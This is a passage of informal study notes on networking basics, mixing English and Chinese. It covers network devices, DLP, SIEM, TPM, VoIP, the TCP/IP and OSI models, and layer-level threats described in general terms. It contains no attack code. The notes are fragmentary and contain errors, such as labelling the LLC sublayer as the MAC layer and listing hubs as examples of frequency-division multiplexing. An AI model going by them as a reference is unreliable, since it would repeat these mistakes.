▸ traditionally used in corporate environments for cross- connecting phone system cabling.
▸ As 10-Mbps LANs grew in popularity, in the late 1980s and early 1990s, these termination blocks were used to cross- connect Cat 3 UTP cabling.
▸ The electrical characteristics: crosstalk (interference between different pairs of wires)
▸ do not support higher- speed LAN technologies, such as 100-Mbps Ethernet networks.
110 block:
▸ 110 blocks can terminate a cable (example, a Cat 5 cable) being used for those higher-speed LANs.
◦
- With such a wide variety of copper and fiber cabling used by different network devices, you might need one or more media converters.
◦ Fiber (MMF or SMF) to Ethernet ◦ Fiber to coaxial ◦ SMF to MMF
Wireless Technologies
- Not all media is physical, as is the case of wireless network technologies.
- include multiple standards that support various transmission speeds and security features.
- Sample wireless topology, wireless clients gain access to a wired network by communicating via radio waves with a wireless access point (AP). The AP is then hardwired to a LAN.
- But, when all wireless devices connecting to the same AP are considered to be on the same shared network segment
◦ means that only one device can send data to and receive data from an AP at any one time.
Network Infrastructure Devices
- The devices used in a network infrastructure can vary based on the Layer 1 technology used.
◦ a Token Ring network might use a multistation access unit (MAU)
◦ an Ethernet network might use a switch.
- Because Ethernet-based networks are dominant in today’s LANs, however, the
infrastructure devices presented here lend themselves to networks using Ethernet as the Layer 1 transport. Some devices (such as a router, example) function basically the same regardless of the Layer 1 transport being used.
Specialized Network Devices
- network infrastructure devices: make up the backbone of a network
- specialized network devices: for added end-user functionality
VPN Concentrators
- Companies with multiple locations needs secure communications between sites.
◦ Use multiple WAN connections interconnecting those sites.
◦ virtual private network (VPN): a secure tunnel
▸ more cost-effective, ▸ create secure connections through an untrusted network (like Internet)
- headquarters device:
◦ the devices that terminate the ends of a VPN tunnel
◦ headquarters location with VPN connections to each of 100 remote sites.
◦ The headquarters device terminating these VPN tunnels:
▸ have to perform encryption and authentication for each tunnel,
▸ Depending on the VPN technology, headquarters device might be
required to perform heavy processing. resulting in a heavy
processor burden on that device.
- Although several router models can terminate a VPN circuit, but dedicated
device is VPN concentrator
◦ performs the processor-intensive process required to terminate multiple
VPN tunnels.
◦ capability to encrypt data.
◦ encryption: capability of a device to scramble data from a sender in such
a way that the data can be unscrambled by the receiver, but not by any other party who might intercept the data.
Content Engines
- caching/content engines: dedicated appliances to perform content caching. ◦ Even proxy servers can perform content caching.
- Multiple requests from branch office clients for the content can then be serviced from the content engine at the branch office
◦ eliminating the repetitive transfer of the same data.
◦ Depending on traffic patterns, might provide significant WAN bandwidth
savings.
Content Switches
- The servers making up this server farm house the same data.
◦ For companies with a large Internet presence (like search engine
company, online book store, social networking), a single server could
be overwhelmed with requests flooding in from the Internet.
◦ content switch/load balancer:
▸ alleviate the burden placed on a single server,
▸ distributes incoming requests across the various servers in the server
farm,
▸ each of which maintain an identical copy of data and applications.
- A major benefit ◦ it allows a server farm to scale.
◦ new servers can be added to the group of servers across which requests
are load balanced.
◦ Also, if maintenance (example, applying an operating system patch) needs
to be performed on a server, a server can simply be taken out of the load-balancing rotation, with the remaining servers picking up the slack. Then, after the maintenance is complete, the server can once again be added back to the defined server group.
Data loss prevention (DLP) systems
monitor the contents of systems (workstations, servers, and networks) to make sure that key content is not deleted or removed.
  - Resolution: block USB and other interfaces.
also monitor who is using/transmitting the data. (looking for unauthorized access) DLP systems share commonality with network intrusion prevention systems. monitoring can be cloud based and limited to specific applications (like email). Example:
   - Receive non-company account from coworker with sensetive information: Implement DLP solution on the email gateway to scan email and remove sensitive data or files.
MyDLP (One of the best-known DLP systems)
open source solution that runs on most Windows platforms. www.mydlp.org.
A large number of commercial programs are available for purchase.
RSA is another popular DLP product, and there are others available from McAfee, Palisade Systems, and Global Velocity. Tripwire monitors
a great system for data protection.
specific files to see if they have changed.
If they have, either restore them or simply alert an administrator.
Both a commercial and an open source version of Tripwire are available.
security information and event management (SIEM).
Security information management (SIM) + security event management (SEM)
A number of vendors sell all-in-one SIEM as managed services (not software-only or appliance- based solutions).
aggregate and correlate the events that come in, SIEM products provide real-time analysis of security alerts that are flagged by network appliances and software applications (aggregation).
Also can perform time synchronization as well and event deduplication: removing multiple reports on the same instance and then act based on automated alert and trigger criteria.
Long-term storage of log files is built into many implementations as well as write- once-read-many (WORM) protection: assure the data cannot be tampered or modified with once it is written to the device.
Hardware Security Module In addition to software-based encryption, hardware-based encryption can be applied. Within the advanced configuration settings on some BIOS configuration menus, Example:
Trusted platform module (TPM)
assist with hash key generation.
TPM is the name assigned to a chip for store cryptographic keys, passwords, or
certificates.
can be used to protect smartphones, devices, PCs as well.
can also be used to generate values used with whole disk encryption like BitLocker.
  - BitLocker can be used with or without TPM.
  - more secure when coupled with TPM (preferable, in fact) but does not
require it.
The TPM chip may be installed on the motherboard. When it is, in many cases it is set to off in the BIOS by default.
verifying the presence of a Tpm Chip in windows
1. Control Panel > Security.
2. choose BitLocker Drive Encryption.
3. A dialog box will appear. The contents of the box do not matter. What does matter is a link in the lower-left corner TPM Administration. If the link is there, TPM is installed and active.
4. If you don’t see the link but are certain that your computer contains such a chip, you may need to boot into your BIOS Setup menu and enable TPM before trying this again.
HSM (hardware security module) a cryptoprocessor that can be used to enhance security.
commonly used with PKI systems to augment security with certification authorities
(CAs).
As opposed to being mounted on the motherboard like TPMs, HSMs are traditionally packaged as PCI adapters.
Virtual Network Devices
Virtual Servers
- virtualization: The computing power available in a single high-end server is often sufficient to handle the tasks of multiple independent servers.
- multiple servers (may be different operating systems) can run in virtual server instances on one physical device.
- example, a single high-end server might be running below in the same time.
◦ a Microsoft Windows Server providing Microsoft Active Directory (AD)
services to an enterprise,
◦ a Linux server acting as a corporate web server,
◦ a Sun Solaris UNIX server providing corporate DNS services.
- Although the virtual server in the figure uses a single network interface card (NIC)网卡 to connect out to an Ethernet switch, many virtual server platforms support multiple NICs.
◦ Having multiple NICs offers increased throughput and load balancing.
NOTE Although the previous example used a Linux-based web server, be aware that web servers can run on a variety of operating system (OS) platforms.
As one example, Microsoft Windows servers support a web server application called Internet Information Services/Server (IIS)
Virtual Switches
- virtual server: all servers belong to the same IP subnet, which could have QoS and security implications.
- If these server instances ran on separate physical devices
◦ they could be attached to different ports on an Ethernet switch.
◦ different switch ports could belong to different VLANs,
◦ place each server in a different broadcast domain.
- Fortunately, some virtual servers allow you to still have Layer 2 control (example, VLAN separation
- and filtering). This Layer 2 control is made possible by the virtual server not only virtualizing instances of servers, but also virtualizing a Layer 2 switch.
◦ the servers logically reside on separate VLANs, and frames from those servers are appropriately tagged when traveling over a trunk to the attached Ethernet switch.
Virtual Desktops
- need access to information stored on other computers’ hard drives from other locations.
◦ a user’s data is stored in a data center rather than on an office computer’s hard drive.
◦ By providing authentication credentials, a secure connection can be established between the centralized repository of user data and that user’s device,
◦ thus allowing the user to remotely access her document.
Other Virtualization Solutions
- on-site:
◦ virtualization technologies (virtual servers, virtual switches, and virtual desktops) residing at a corporate location.
- off-site options:
◦ did not want to house and maintain his own data center,
◦ these virtualization technologies could be located at a service provider’s
data center,
◦ Network as a Service (NaaS):
▸ the customer could be billed based on usage patterns.
▸ Implying that network features can be provided by a service
provider.
◦ Software as a Service (SaaS):
▸ An application service provider (ASP) provides application software access to subscribers. - telephony service provider offers access to the Public Switched Telephone Network (PSTN), and an ISP offers access to the public Internet.
◦ own and maintain their own Private Branch Exchange (PBX), privately owned telephone system.
◦ Outsourced:
◦ use a service provider’s virtual PBX, usually a Voice over IP (VoIP)
solution,
▸ where voice is encapsulated inside data packets for transmission
across a data network.
◦ Typically, a service provider provides all necessary IP telephony gateways
to convert between a customer’s telephony system and the service provider’s virtual PBX.
Voice over IP Protocols (VoIP) and Components
- digitizes the spoken voice into packets and transmits those packets across a data network.
◦ allows voice, data, and even video to share the same medium.
◦ cost savings over a traditional PBX solution,
◦ many VoIP networks offer enhanced services (video conferencing app and
calendaring APP)
- A virtual PBX : VoIP
- a hosted PBX: a traditional PBX hosted by a service provider.
- Description
- IP phone:
◦ a telephone with an integrated Ethernet connection. Although users speak
into a traditional analog handset (or headset) on the IP phone
◦ digitizes the spoken voice, packetizes it, and sends it out over a data
network (via the IP phone’s Ethernet port).
- Call agent:
◦ a repository for a VoIP network’s dial plan.
◦ when a user dials a number from an IP phone, the call agent analyzes the
dialed digits and determines how to route the call toward the
destination.
- gateway:
◦ in a VoIP network acts as a translator between two different telephony
signaling environments. In the figure, both gateways interconnect a VoIP network with the PSTN. Also, the gateway on the right interconnects a traditional PBX with a VoIP network.
- Private Branch Exchange (PBX):
◦ privately owned telephone switch traditionally used in corporate telephony systems.
◦ Not typically considered a VoIP device, but can connect into a VoIP network through a gateway.
- analog phone:
◦ traditional telephone. Even though an analog phone is not typically
considered a VoIP device, it can connect into a VoIP network via a
VoIP or, a PBX which is connected to a VoIP network.
- Session Initiation Protocol (SIP)
◦ a VoIP signaling protocol used to set up, maintain, tear down VoIP phone calls.
◦ spoken between the IP phone and the call agent to establish a call.
◦ The call agent then uses SIP to signal a local gateway to route the call,
◦ and that gateway uses SIP (across an IP WAN) to signal the remote
gateway about the incoming call.
- Real-time Transport Protocol (RTP)
◦ a Layer 4 protocol that carries voice (and interactive video).
◦ the bidirectional RTP stream does not flow through the call agent.
Define Key Terms
coaxial cable, twisted-pair cable,
shielded twisted-pair cable, unshielded twisted-pair cable,
electromagnetic interference (EMI), plenum, multimode fiber (MMF), single- mode fiber (SMF),
66 block, 110 block,
hub, switch, router, multilayer switch, firewall,
Domain Name System (DNS) server, Dynamic Host Configuration Protocol (DHCP),
proxy server,
content engine, content switch,
virtual server, virtual switch, virtual desktop, on-site, off-site,
Network as a Service (NaaS),
virtual PBX, Session Initiation Protocol (SIP), Real-time Transport Protocol (RTP) ▪


## OSI Model
The TCP/IP Stack
The ISO developed the OSI reference model to be generic, in terms of what protocols and technologies could be categorized by the model.
TCP/IP suit:
  - a suite of protocols that controls the way information travels from location to location
  - a collection of protocols that perform a wide array of functions.
  - 6 protocols generally serve as the foundation of the TCP/IP suite:
  - IP, DNS, TCP,UDP, ICMP and ARP.
- DoD model / TCP/IP stack:
  - Most traffic on the networks based on the TCP/IP protocol suite.
  - a more relevant model is developed by the United States Department
of Defense (DoD). The DoD model / TCP/IP stack.
- Network Control Protocol (NCP):
  - An older protocol, similar to the TCP/IP protocol suite,
  - a protocol used on ARPANET (the predecessor to the Internet),
  - provided features similar to (not as robust) to TCP/IP suite of
protocols.
TCP/IP model:
     ▪


##   TCP/IP stack vs OSI model: biggest difference is in application layer.
  - Maps to Layers 5, 6, and 7 (the session, presentation, and application
layers) of the OSI model.
With the reduced complexity of a four-layer model, like the TCP/IP stack, network designers can easiler categorize a networking technology into a specific layer.
example:
H.323 was identified earlier as a session layer protocol within the OSI model, you would have to know more about the behavior of H.323 to properly categorize it.
with the TCP/IP stack, you could quickly determine that H.323 is a higher- level protocol that gets encapsulated inside of TCP, and thus classify H.323 in the application layer of the TCP/IP stack.
Common Application Protocols in the TCP/IP Stack
   ▪


##  Application layer protocols in the TCP/IP stack: identifiable by port numbers.
example:
when enter web address in browser, you are (by default) communicating with that remote web address, uses a TCP port 80.
  - Hypertext Transfer Protocol (HTTP), commonly used by web servers, Therefore, the data you send to that remote web server has a target port
number of 80.
That data is then encapsulated into a TCP segment at the transport layer. That segment is then encapsulated into a packet at the Internet layer,
the packet is sent out on the network using an underlying network interface layer technology (like Ethernet).
  - the packet:
  - needs destination IP address of the web server and the port number for
HTTP (80)
  - also needs the IP address of your computer, your computer selects a
port number greater than 1023. (Because your computer is not acting as a web server, its port is not 80.)
when the web server sends content back to the PC, the data is destined for the PC’s IP address and for the port number PC selected.
With both source and destination port numbers, source and destination IP addresses, two-way communication becomes possible.
well-known ports: ports numbered below 1023 ephemeral ports: ports numbered above 1023 The maximum value of a port is 65,535.
IP Vulnerabilities
Unencrypted transmission
  - Eavesdropping possible at any intermediate host during routing No source authentication
  - Sender can spoof source address, making it difficult to trace packet back to attacker
             ▪


##  No integrity checking
  - Entire packet, header and payload, can be modified while en route to destination, enabling content forgeries, redirections, and man-in-the- middle attacks
No bandwidth constraints
  - Large number of packets can be injected into network to launch a denial-of-service attack
  - Broadcast addresses provide additional leverage
Physical / Network interface layer:
  - encompasses the physical and data link layers of the OSI model.
  - equipments:
  - repeaters: amplify, reshape or regenerate signal during retransmission.
  - typically used when long distances need to be covered and the distance exceeds the supported length (medium) or range (wireless)
  - hubs: received 1 port and retransmits to every port. (uncommon today)
  - bridges: direct information based on MAC address.
  - switch:
  - low latency
  - half-duplex or full-duplex mode
  - use MAC address
  - each port separate collision domain.
  - higher-end switcher:
  - command-line interface via Telnet or console port to
configure remotely.
  - brewer-based interface or configuration.
  - usual protocal: ARP for IPv4, NDP for IPv6, PPP, SLIP(been replaced by PPP, only in older network)
  - threats:
  - spoofing MAC addresses: bypass the 802.11 wireless controls,
to circumvent switches used to lock ports to specific MAC addresses.
 ▪


##   - poisoning ARP: alter ARP tables or intercept an NA message,
  - wiretapping: third party monitoring internet and telephone
conversations, this attack requires you to tap into a cable for a wired network but can involve listening in on a wireless network.
  - interception: package sniffers...
  - eavesdropping: unauthorized capture and reading of network
traffic.
  - control:
  - fiber optic cable: change transmission media make tremendous
difference in the types of attacks that can be carried out. Fiber is
more secure than wired alternatives and wireless network.
  - WEP, WPA, WPA2: WPA2 include encryption protocols like
AES and TKIP and better key management over WPA.
  - Point-to-point Tunneling Protocol (PPTP):
  - widely used for VPNs,
  - composed of 2 components:
  - transport that maintains the virtual connection
  - and the encryption that ensures confidentiality.
  - Challenge Handshake Authentication Protocol (CHAP): an improvement over previous authentication protocols like PAP, which passwords were sent in cleartext.
network/internet layer:
maps to Layer 3 (the network layer) of the OSI model.
Although multiple routed protocols reside at the OSI model’s network layer, the Internet layer of the TCP/IP stack focuses on IP as the protocol to be routed through a network.
equipment:
  - Router: edge devices:
  - do not broadcast
  - forward multicast
  - highest latency
  - most flexibility
  - base on IP
  - require configuration.
protocols: most important protocol is IP. ICMP
 ▪


##  threat:
  - sniffer:
  - to realize the full potential of a sniffer, certain conditions have to be in
place.
  - most important is the ability for a network card to be put into
promiscuous mode
  - The card can view all traffic moving past it rather than just the traffic destined for it
  - there are programs to accomplish this for Linux and Windows
  - Linus: libpcap
  - Win: WinPcap
  - next, install a sniffer:
  - wireshark control:
  - IP Security (IPSec): most widely used standard to protect IP datagrams
  - an integral part of IPv6.
  - can be at or above the Network or Internet Layer.
  - can be used by applications and is transparent to end users.
  - address 2 security problems: confidential and intergrity.
  - packet filters: configured through ACLs
  - ACLs enable rule sets to be built that will allow or block traffic
based on header information.
  - Network address translation (NAT): originally developed to address
the growing need for IPv4.
  - a small measure of security is added by NAT.
  - IPv6 no need for NAT, it has enough address.
The format of an IPv4 packet:
◦ | Version | Header Length | Type of Service | Total Length
 ◦ | Identification
◦ | TTL | Protocol
◦ | Source Address
◦ | Destination Address
| IP Flags | Fragment Offset | Header Checksum ▪


## ◦ | IP Option (Variable Length)
source and a destination IP address.
from which the packet was sent or to which the packet should be sent.
Time-to-Live (TTL) field: (up to 255)
The value decremented by one every time this packet is routed from one IP network to another (passes through a router).
When TTL value reaches 0, the packet is discarded from the network. Helps prevent routing loops.
Host-to-Host Layer
segment the data and adds a checksum to ensure no corruption. lower 2 layer: hardware and software
upper 2 layer: do not have hardware to carry their function. Almost always implemented in software.
primary job: provide end-to-end delivery (Transport layer)
  - 2 protocols in this layer: send the data with TCP or UDP
threat:
  - port scanning: a message is sent to each prots.
  - Session hijack: attacker places himself between the victim and the
Server
  - possible since authentication typically is done only ay the state
of TCP session.
  - SYN attack: DDos. Keep sending SYN packets but no last ACK
packet to acknowledge and confirm receipt. Let server run put of open connections
control:
  - Secure sockets layer (SSL): older security-orinented protocol
  - considered application independent and can be used with HTTP, FTP, and talent to run on top of it transparently.
  - use public key based on RSA.
  - Transport layer security (TLS):
  - upgrade to SSL and is backward compatible, but they do not interoperate.
     ▪


##   - design to be application independent.   - SOCKS:
  - allows client/server applications to work when separated by one or more firewalls.
  - Secure RPC (S/RPC):
  - adds a layer of security onto the RPC process by adding DES
encryption.
Application layer
top of TCP/IP model, maps to OSI layers 567.
interacts with applications that need to gain access to network services.
application layer services:
  - each service use a port number to help direct traffic.
  - 65,535 ports:
  - well-known ports (0-1023)
  - registered ports (1024-49151)
  - dynamic port (49152-65535)
  - fewer than 100 are in common use.
    - ▪


##  application layer threats:
  - malicious software (malware): trojan, spyware, virus, worm, ransomware.
  - DoS attack application layer control:
  - malware scanners
  - SSH: A secure application Layer program that has security
features built in.
  - PGP: uses asymmetric key, offer protection for email.
  - S/MIME: secure email by using X.509 certificates for
authentication.
International Organization for Standardization (ISO) developed a subcommittee to focus on the interoperability of multivendor communications systems.
What sprang from this subcommittee was the Open Systems Interconnection (OSI) reference model (commonly referred to as the OSI model or the OSI stack).
another model (the TCP/IP stack, also known as the Department of Defense [DoD] model), which focuses on Internet Protocol (IP) communications.
Foundation Topics - The Purpose of Reference Models
function of a network technology - state at what layer (or layers) of the OSI model that technology operates.
The OSI Model
All People Seem To Need Data Processing. Layer 1: The physical layer
Layer 2: The data link layer
   ▪


##      - •
•
Layer 3: The network layer Layer 4: The transport layer Layer 5: The session layer Layer 6: The presentation layer Layer 7: The application layer
binary expressions (a series of 1s and 0s) represent data, made up of bits. bits are grouped together, into a protocol data unit (PDU) or a data service
unit or packet.
PDU: Some People Fear Birthdays (Segments, Packets, Frames, Bits)
      Layer 1: The Physical Layer (Bits)
- the transmission of data on the network.
- Defines the electrical and mechanical requirements used to
transmit information to and from systems across a transmission
medium.
- Dictates how the info is to be sent. (Digital/analog signaling
methods, base/broadband, synchronous/asynchronous transmission)
- How bits are represented on the medium: representing binary data.
- current state modulation: represent a binary 1 or a binary 0 by:
  - the presence or the absence of voltage on a wire.
  - the presence or absence of light on a fiber-optic cable.
- This type of approach is called:
  - state transition modulation:
  - An alternate approach to represent binary data.
  - transition between voltages or the presence of light
indicates a binary value.
  - Other modulation types familiar with from radio   - Amplitude modulation (AM): variation in a waveform’s amplitude (signal strength) to represent the signal.
  - Frequency modulation (FM): variation in frequency to represent the signal.
Physical layer characteristics:
- Voltage levels
- Data rates
- Maximun transimission distances
- Timing of voltage changes
- Physical connectors and adaptors
- Topology or physical layout of the network
■ Wiring standards for connectors and jacks:
TIA/EIA-568-B standard: describes how an RJ-45 connector should be wired for use on a 100BASE-TX Ethernet network.
■ Physical topology:
- Layer 1 devices view a network as a physical topology (真實的
device/cable的配置), not logical topology (指data如何傳送 / 電腦間怎 麼溝通的配置).
- Examples: bus, ring, and star topologies,.
■ Synchronizing bits 同步器 比特同步:
For two networked devices to successfully communicate at the physical
layer, they must agree on when one bit stops and another bit starts. Two basic approaches to bit synchronization:
Asynchronous: 异步的
- a sender indicates sending a start bit to the receiver. start
transmitting,
- the receiver sees this, starts its own internal clock to measure the
subsequent bits. - After the sender transmits its data, sends a stop bit to indicate that is has finished its transmission.
Synchronous: 同步的
- This approach synchronizes the internal clocks of both the sender
and receiver to ensure that they agree on when bits begin and end. - use an external clock (example, a clock provided by a service
provider), which is referenced by both the sender and receiver.
■ Bandwidth usage: The two fundamental approaches to bandwidth usage on a network:
Broadband technologies: dianhuaxian??
- divide the bandwidth available on a medium (copper or fiber-optic cabling) into different channels.
- 将基带信号进行调制后形成的频分复用模拟信号
- Different communication streams are then transmitted over the various channels.
- Frequency-Division Multiplexing (FDM) used by a cable modem.
- a cable modem uses certain ranges of frequencies on the cable coming into your home from the local cable company to carry incoming data, another range of frequencies for outgoing data, and several other frequency ranges for various TV stations.
· 将信道分成多个子信道，分别传送音频、视频和数字信号
· 宽带是比音频带宽更宽的频带，它包括大部分电磁波频谱。
· 宽带是传输模拟信号。 一般说，宽带传输与基带传输相比有以
下优点:
◦ 能在一个信道中传输声音、图像和数据信息，使系统具有多种
用途;
◦ 一条宽带信道能划分为多条逻辑基带信道，实现多路复用，因
此信道的容量大大增加;
◦ 宽带传输的距离比基带远，(基带传输直接传送数字信号，传
输的速率越高，传输的距离越短。) Baseband technologies: 基带 wangxian??
- use all the available frequencies on a medium to transmit data.
- 直接将数字信号1或0用两种不同的电压表示, 然后送到线路上
传输.
- Example of a networking technology uses baseband: Ethernet
■ Multiplexing strategy: 多路复用
- allows multiple communications sessions share the same physical
medium.
◦ Cable TV allows you to receive multiple channels over a single
physical medium (example, a coaxial cable plugged into the back of your television).
- 因数字信号是有限个离散值，所以TDM技术广泛应用于包括计 算机网络在内的数字通信系统，而模拟通信系统的传输一般采用
FDM。
Here are some of the more common approaches to multiplexing:
- 同步传输(STM)
◦ 其交换是在固定时隙之间进行的。
- 在这种固定时隙的传输及交换模式中:
◦ 若在通信过程中的某一时刻，用户无数据传递，但其固定占用
的时隙仍属其所有，尽管此刻处于空闲状态;
◦ 相反，若其有大量突发性数据要求传送，尽管这有可能造成信
号的延时甚至是信元的丢失，也仍只能借助于固定的时隙来传输和
交换。
- Asynchronous Transfer Mode (ATM) 异步传输模式
◦ ATM是一种传输模式，在这一模式中，信息被组织成信元，因 包含来自某用户信息的各个信元不需要周期性出现，因此这种传输 模式是异步的。
◦ 其信元传输所占用的时隙并不固定,这也是所谓的统计时分复 用。 ◦ 另外，在一帧中占用的时隙数也不固定,可以有1至多个时隙， 完全根据当时用户通信的情况而定。
◦ 而且各时隙之间并不要求连续，纯粹是“⻅缝插针”。在交换 时，也是类似的。
◦ 由于在ATM中具有动态分配带宽的特点，可以充分地利用带宽 资源,并且能很好地满足传输突发性数据的要求，而不致出现在 ATM中的延时或信元丢失的情况。
◦ 是国际电信联盟ITU-T制定的标准，在80年代中期人们就已经 开始进行快速分组交换的实验，建立了多种命名不相同的模型。欧 洲重在图象通信把相应的技术称为异步时分复用(ATD)美国重在 高速数据通信把相应的技术称为快速分组交换(FPS)，国际电联 经过协调研究，于1988年正式命名为Asynchronous Transfer Mode (ATM) 技术，推荐其为宽带综合业务数据网B-ISDN的信息传输 模式。
◦ ATM信元是固定⻓度的分组，共有53个字节，分为2个部 分。
▸ 前面5个字节为信头，主要完成寻址的功能;
▸ 后面的48个字节为信息段，用来装载来自不同用户，不同业 务的信息。
▸ 话音，数据，图象等所有的数字信息都要经过切割，封装成统 一格式的信元在网中传递，并在接收端恢复成所需格式。
◦ 由于ATM技术简化了交换过程，去除了不必要的数据校验，采 用易于处理的固定信元格式，所以ATM交换速率大大高于传统的数 据网，如x.25，DDN，帧中继等。
◦ 另外，对于如此高速的数据网，ATM网络采用了一些有效的业 务流量监控机制，对网上用户数据进行实时监控，把网络拥塞发生 的可能性降到最小。 般数据文件传输的正确性特权最高，网络对不同业务分配不同的网 络资源，这样不同的业务在网络中才能做到“和平共处”。
◦ ATM的一般入网方式中，与网络直接相连的可以是支持ATM协 议的路由器或装有ATM卡的主机，也可以是ATM子网。在一条物理 链路上，可同时建立多条承载不同业务的虚电路，如语音，图象， 文件传输等。
- Time-division multiplexing (TDM): 时分复用
◦ 即是在一条通信线路上, 按一定的周期(如125ns)将时间分成 称为帧(frame)的时间块，
◦ 在每一帧中又分成若干时隙(time slot).
◦ 每个时隙可携带相应的用户信息。每一个时间槽固定地给一个 持续的通讯连接使用，
◦ “固定”指的是不同的帧中同一位置的时间槽均给某一持续通讯 连接使用。
◦ 当某一用户通过呼叫建立起通信后，在此期间，其信号将固定 地占用各帧中的某一时隙，直至通信结束
◦ 在TDM中，一个电路(circuit，即connection)的传输速率等于
传输帧的速率乘以一个时间槽中含有的比特数。
◦ example:
▸ 640000bits的文件, 从A传到B, 使用TDM, 假设在网络中的所有 连接都需要24个时间槽, 且这个网络的比特传输速率为1.536Mbps， 在传输数据前建立一个端对端电路需要500msec。请问传输需要多 少时间?
- 由于每个连接需要24个时间槽,所以这个网络的传输时间被分为 24个帧，
- 所以每个帧的传输速率为:
- 1.536Mkps/24 = 64kbps，这就是一个连接的传输速率。
- 则传输这个文件需要时间:
- 640000bits/64kbps = 10s， - 加上建立时间，总时⻓为 10 + 0.5 = 10.5s
▸ 线路传输速率为1 Mbps，假设每一个用户有10%的时间是传输 数据且速率为100 kbps，有90%时间是空闲的。若使用TDM，每一 个帧被分为10个槽，每个帧为1s，则每一个槽为100ms。问，平均 每个槽传输多少比特?
- 100ms*100kbps*10%=1000 bits
◦ TDM supports different communication sessions (like telephone conversations in a telephony network) on the same physical medium by causing the sessions to take turns.
◦ data from the first session will be sent, followed by data from the second sessions. This continues until all sessions have had a turn, and the process repeats itself.
◦ TDM downside:
▸ each communication session receives its own time slot,
▸ even if one of the sessions does not have any data to transmit at the
moment.
◦ Statistical time-division multiplexing (StatTDM):
▸ StatTDM dynamically assigns time slots to communications sessions on an as-needed basis.
- more efficient use of available bandwidth,
- Frequency-division multiplexing (FDM):
◦ FDM divides medium’s frequency range, different communicate sessions transmit data in different channels.
◦ this approach to bandwidth usage is called broadband.
◦ Example: hubs, wireless access points, and network cabling.
◦ 将传输信号通道(link)的总带宽分成若干频带,每个频带给一个
持续的通讯连接(duration connection) 使用，频带间互不干扰。 hub:
- interconnect PCs in a LAN. However
- a physical layer device
- a hub takes bits coming in on one port and retransmits those bits out
all other hub ports.
- A hub dont interrogate any addressing information in the data. ▪


## Potentially attack:
- Gain direct access to physical devices.
- Place devices to capture and analyze the network traffic.
Link layer
Local area network: Ethernet, WiFi, optical fiber 48-bit media access control (MAC) addresses Packets called frames
Network layer
Internet-wide communication
Best efforts
32-bit internet protocol (IP) addresses in IPv4 128-bit IP addresses in IPv6
Transport layer
16-bit addresses (ports) for classes of applications Connection-oriented transmission layer protocol (TCP) Connectionless user datagram protocol (UDP)
Layer 2: The Data Link Layer (Frames)
These processes are collectively referred to as data link control (DLC).
Frames: a container into wich the data to be transmitted can be plced
for delivery.
  - A standard format for sending and receiving data is established, allowing for mutual understanding of the data being hardled.
  - Ethernet (IEEE 802.3), token ring (IEEE 802.5), and wireles (IEEE 802.11) all have their own qnique and incompatible frame type.
transmitting frames on the network,
   ▪


##   - Sending station: packages the info into frams
  - Receving station: unpacks the info from frams and moves it
along to the next layer for further processing. performing error detection/correction,
uniquely identifying network devices with an address, handling flow control: data management. avoid overwhelm.
two sublayers: LLC and MAC.
MAC:Medium access control (MAC) layer
  - responsible for controlling how devices in a network gain access to a medium and permission to transmit data.
  - 主要负责控制与连接物理层的物理介质。
  - 可以事先判断是否可以发送数据，如果可以发送将给数据加上一
   些控制信息，最终将数据以及控制信息以规定的格式发送到物理
层;
  - 在接收数据的时候，MAC协议首先判断输入的信息并是否发生传
输错误，如果没有错误，则去掉控制信息发送至LLC(逻辑链路
控制)层。
  - 主要功能包括数据帧的封装/卸装，帧的寻址和识别，帧的接收与
   发送，链路的管理，帧的差错控制等。
  - MAC子层的存在屏蔽了不同物理链路种类的差异性。
LLC子层: Medium access control (MAC) layer
  - responsible for identifying and encapsulating network layer protocols, and controls error checking and frame synchronization.
  - 主要功能:
  - 传输可靠性保障和控制;
  - 数据包的分段与重组;
  - 数据包的顺序传输。
Devices defined by data link layer standards: switches, bridges, and network interface cards (NIC).
NICs are not entirely defined at the data link layer, because they are
       partially based on physical layer standards, such as a NIC’s network connector.
Media Access Control (MAC) 48 bits
- Physical addressing:
◦ assigned at network interface card (NIC) 网卡/网络适配器.
◦ Hexadecimal notation (like 58:55:ca:eb:27:83).
◦ The first 24 bits: vendor code.
▸ Vendors of networking equipment are assigned one or more unique vendor codes.
▸ List of vendor codes at http://standards.ieee.org/develop/ regauth/oui/oui.txt
◦ last 24 bits:
▸ Each vendor is responsible for using unique values.
▸ no two MAC addresses in the world should have the same
value.
- Logical topology: Layer 2 devices view a network as a logical
topology. (Like bus or ring topologies)
- Method of transmitting on the media: With several devices
connected to a network, there needs to be some strategy for determining when a device is allowed to transmit on the media. Otherwise, multiple devices might transmit at the same time, and interfere with one another’s transmissions.
Logical Link Control (LLC)
- 用户的数据链路服务通过LLC子层为网络层提供统一的接口。在LLC子 层下面是MAC子层。
  - Connection services: the receiver's recipient device can provide feedback to the sender in the form of an acknowledgment message which provide the two main functions.
  - Flow control:
  - Limits the amount of data a sender can send at one time;
  - prevents the receiver from being overwhelmed with too
much information.
  - Error control:   - Whether the checksum match the checksum received with the data frame,
  - See if the data frame received or not, or is corrupted.
  - notify the sender via an acknowledgment message.
- Synchronizing transmissions 同步传输:
  - Senders and receivers need to coordinate when a data frame should be transmitted and received.
  - Three methods of performing this synchronization:
  - Isochronous同时的:
  - network devices look to a common device in the network as a clock source (creates fixed-length time slots)
  - Network devices can determine how much free space, if any, is available within a time slot,
  - insert data into an available time slot.
  - A time slot can accommodate more than one data frame.
  - does not need to provide clocking at the beginning of a
data string (as does synchronous transmission) or for
every data frame (as does asynchronous transmission).
  - As a result, isochronous transmission uses little overhead
when compared to asynchronous or synchronous
transmission methods.
  - Asynchronous 异步的:
▸ network devices use their own internal clocks (don't synchronize their clocks.)
▸ the sender places a start/stop bit at the beginning/end of each data frame.
- start and stop bits tell the receiver when to monitor the medium for the presence of bits.
▸ An additional bit, parity bit, add to the end of each byte to perform error detection.
•
even parity error detection (as opposed to odd parity error detection):
◦ the parity bit (with a value of either 0 or 1) would be
added to the end of a byte, causing the total number of 1s in the data frame to be an even number.
◦ If the receiver receives a byte where the total number of bits (including the parity bit) is even, ⁃
◦ the receiver conclude that the byte was not corrupted
during transmission.
- NOTE: may not be effective if byte has more than one
error (more than one bit has been changed).
Synchronous同步:
▸ two network devices that want to communicate between
•
•
themselves must agree on a clocking method to indicate the beginning and ending of data frames.
use a separate communications channel over which a clock signal is sent.
relies on specific bit combinations or control characters to indicate the beginning of a frame or a byte of data.
▸ can also perform error detection.
- runs a mathematical algorithm on the data to create a
cyclic redundancy check (CRC). If both the sender and receiver calculate the same CRC value for the same chunk of data, the receiver conclude that the data was not corrupted during transmission.
Ethernet
- Working with local-area networks (LAN) = working with Ethernet as the Layer 1 technology.
